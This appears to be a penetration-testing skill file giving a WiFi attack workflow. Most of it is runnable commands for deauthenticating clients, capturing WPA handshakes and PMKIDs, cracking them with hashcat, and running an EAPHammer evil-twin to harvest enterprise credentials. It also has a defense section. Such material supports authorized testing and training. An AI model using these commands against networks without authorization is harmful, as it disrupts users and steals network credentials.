---
name: wifi-penetration-testing
description: >
  Conduct comprehensive penetration testing against Wireless Networks (802.11). Use this skill
  when assessing the physical/wireless perimeter of an organization. Covers monitor mode, packet
  injection, WPA/WPA2 PSK cracking via 4-way handshakes and PMKID, WPA Enterprise (802.1x)
  evil twin attacks, WPS PIN bruteforcing, and rogue access point deployment.
domain: cybersecurity
subdomain: penetration-testing
category: Wireless & IoT
difficulty: intermediate
estimated_time: "4-8 hours"
mitre_attack:
  tactics: [TA0001, TA0006, TA0040]
  techniques: [T1003, T1557.003, T1498]
platforms: [linux]
tags: [wifi, wireless-pentest, wpa2, aircrack-ng, evil-twin, hashcat, pmkid, 802.1x]
tools: [aircrack-ng, wifite, hcxdumptool, hcxpcapngtool, eaphammer, hashcat]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# WiFi Penetration Testing

## When to Use
- During Red Team physical assessments or wireless penetration tests.
- When evaluating the security of corporate WPA2/WPA3-PSK or WPA-Enterprise (802.1x) networks.
- When testing for Rogue Access Points or assessing Wireless Intrusion Prevention Systems (WIPS).
- When attempting initial access from the parking lot/lobby of a target facility.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Hardware Setup & Reconnaissance

```bash
# 1. Ensure you have a wireless adapter supporting Monitor Mode and Packet Injection
# (e.g., Alfa AWUS036ACH, Panda PAU09)

# 2. Kill interfering network managers
sudo airmon-ng check kill

# 3. Put interface into monitor mode (assuming interface is wlan0)
sudo airmon-ng start wlan0
# Interface becomes wlan0mon

# 4. Discover networks (BSSIDs, channels, encryption, clients)
sudo airodump-ng wlan0mon
# Note the target's BSSID, Channel (-c), and connected client MAC addresses.
```

### Phase 2: WPA/WPA2 PSK - 4-Way Handshake Capture

```bash
# Concept: Deauthenticate a connected client to force them to reconnect.
# When they reconnect, capture the 4-way encrypted handshake.

# 1. Focus airodump-ng on the specific AP and channel, save output
sudo airodump-ng -c TARGET_CHANNEL --bssid TARGET_BSSID -w capture_file wlan0mon

# 2. In a NEW terminal, send deauth frames to a specific client
sudo aireplay-ng -0 5 -a TARGET_BSSID -c CLIENT_MAC wlan0mon

# 3. Watch the airodump-ng window for "WPA handshake: TARGET_BSSID"
# Once captured, convert the .cap file to a hashcat crackable format
hcxpcapngtool -o hash.hc22000 -E essidlist capture_file*.cap
```

### Phase 3: WPA/WPA2 PSK - Clientless PMKID Attack

```bash
# Concept: Extract the PMKID directly from the AP without needing any connected clients.
# Much quieter and more reliable than waiting for a 4-way handshake.

# 1. Use hcxdumptool to attack the AP and request the PMKID
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --enable_status=1 --filterlist_ap=target_bssid.txt --filtermode=2

# 2. Wait until PMKID is captured (can take a few minutes)

# 3. Convert pcapng to hashcat format
hcxpcapngtool -o hash.hc22000 pmkid_capture.pcapng
```

### Phase 4: Offline Cracking (Hashcat)

```bash
# Take the captured hash.hc22000 back to a powerful GPU cracking rig

# 1. Dictionary attack using RockYou
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# 2. Rule-based attack (e.g., OneRuleToRuleThemAll)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /path/to/rules/OneRuleToRuleThemAll.rule

# 3. Mask attack (e.g., known company pattern: CompanyNAME2024!)
hashcat -m 22000 -a 3 hash.hc22000 "CompanyNAME?d?d?d?d!"
```

### Phase 5: WPA Enterprise (802.1x) Evil Twin Attack

```bash
# Concept: Stand up a fake AP with the same SSID as the corporate network.
# Trick laptops/phones into connecting and steal their MSCHAPv2 hashes.

# 1. Use EAPHammer to set up a rogue AP with a self-signed certificate
sudo ./eaphammer --bssid 11:22:33:44:55:66 --essid "Corp-WiFi" --channel 6 --interface wlan0mon --creds

# 2. As clients attempt to connect, EAPHammer performs a downgrade attack
# and captures NT hashes or plain-text credentials (depending on client config).

# 3. Crack the captured MSCHAPv2 hashes using asleap or hashcat
hashcat -m 5500 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Phase 6: Automated Testing tools

```bash
# For rapid assessments, use Wifite to automate the reconnaissance, 
# deauthentication, PMKID retrieval, and basic cracking pipeline.

sudo wifite --kill --dict /usr/share/wordlists/rockyou.txt
```

## 🔵 Blue Team Detection & Defense
- **Strong Passphrases**: Use WPA2/WPA3 with passwords > 16 random characters to effectively neutralize offline cracking.
- **WPA3 Implementation**: Transition to WPA3 strictly; it protects against offline dictionary attacks via Simultaneous Authentication of Equals (SAE) preventing PMKID and Handshake captures.
- **Certificate Validation**: For WPA-Enterprise (802.1x), enforce strict server certificate validation via Group Policy (Windows) or MDM profiles to stop Evil Twin/EAP downgrade attacks.
- **WIPS/WIDS Deployment**: Deploy robust Wireless Intrusion Prevention Systems to detect PMKID requests, mass deauthentication frames, and Rogue APs broadcasting corporate SSIDs.

## Key Concepts
| Concept | Description |
|---------|-------------|
| Monitor Mode | Network interface mode intercepting all wireless traffic in the air, not just traffic intended for the host |
| 4-Way Handshake | Process of authenticating and establishing keys between AP and client over WPA/WPA2 |
| PMKID | Pairwise Master Key Identifier, vulnerable to extraction enabling offline password cracking without clients |
| Evil Twin | A rogue access point impersonating a legitimate AP to intercept credentials or traffic |
| EAP/802.1x | Extensible Authentication Protocol, used in WPA-Enterprise where users have unique credentials (username/password/cert) |

## Output Format
```
WiFi Penetration Testing Report
===============================
SSID Target: CorpNet-Guest
BSSID: 00:1A:2B:3C:4D:5E
Encryption: WPA2-PSK (CCMP)

Attack Vector executed: Clientless PMKID Extraction
Offline Cracking Method: Dictionary (RockYou) + Best64 Ruleset
GPU Rig Time: 12 minutes

Resulting Pre-Shared Key (PSK): Summer2023!

Impact: Full access to the guest network segment.
Recommendation: Update PSK immediately to a high-entropy string of at least 16 characters. Segment guest networks completely from internal routing.
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- Hashcat: [WPA/WPA2 Cracking Guide](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)
- EAPHammer: [GitHub](https://github.com/s0lst1c3/eaphammer)
- Aircrack-ng: [Documentation](https://www.aircrack-ng.org/doku.php)
